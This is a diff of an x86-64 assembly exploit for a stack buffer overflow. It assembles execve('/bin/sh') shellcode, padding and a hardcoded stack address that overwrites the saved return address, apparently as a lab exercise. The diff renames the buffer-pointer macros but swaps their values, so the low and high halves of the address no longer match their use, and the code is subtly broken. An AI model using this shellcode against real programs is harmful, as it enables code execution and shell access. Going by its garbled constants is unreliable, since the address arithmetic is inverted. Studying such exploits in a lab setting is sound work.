@@ -4,14 +4,14 @@
 
 #include <sys/syscall.h>
 
-#define ADD(X, Y) (X + Y)
-#define buffer_ptr_h 0x7fff
-#define buffer_ptr_l 0xffffdf40
+#define BUFFER_PTR_L 0x7fff
+#define BUFFER_PTR_H 0xffffdf40
 #define STRING_LEN 7
 #define PAYLOAD_INSTRUCTION_BYTES 61
 #define VICTIM_BUFFER_SIZE 72
-#define PAD_BYTES (VICTIM_BUFFER_SIZE-PAYLOAD_INSTRUCTION_BYTES-STRING_LEN+16)
 
+#define ADD(X, Y) (X + Y)
+#define PAD_BYTES (VICTIM_BUFFER_SIZE-PAYLOAD_INSTRUCTION_BYTES-STRING_LEN+16)
 #define ARG3_OFFSET (STRING_LEN+1)
 #define ARG4_OFFSET (ARG3_OFFSET+8)
 #define EXECVE_SYSCALL 59
@@ -23,11 +23,11 @@
 main:
 
         xor     %rcx, %rcx
-        xor     $buffer_ptr_h, %cx
+        xor     $BUFFER_PTR_H, %cx
         shl     $32, %rcx
 
         xor     %rax, %rax
-        xor     $ADD(buffer_ptr_l, PAYLOAD_INSTRUCTION_BYTES), %eax     /* lower part of ptr to str "/bin/sh" */
+        xor     $ADD(BUFFER_PTR_L, PAYLOAD_INSTRUCTION_BYTES), %eax     /* lower part of ptr to str "/bin/sh" */
         xor     %rax, %rcx                                              /* ptr to str "/bin/sh" */
 
         xor     %rax, %rax
@@ -48,5 +48,5 @@ main:
 
         .ascii  "/bin/sh"
         .skip   PAD_BYTES, 'a'
-        .long   buffer_ptr_l                                            /* low part of buffer ptr (the first instruction of payload), will overwrite real return address */
-        .long   buffer_ptr_h                                            /* high part of buffer ptr (the first instruction of payload), will overwrite real return address */
+        .long   BUFFER_PTR_L                                            /* low part of buffer ptr (the first instruction of payload), will overwrite real return address */
+        .long   BUFFER_PTR_H                                            /* high part of buffer ptr (the first instruction of payload), will overwrite real return address */
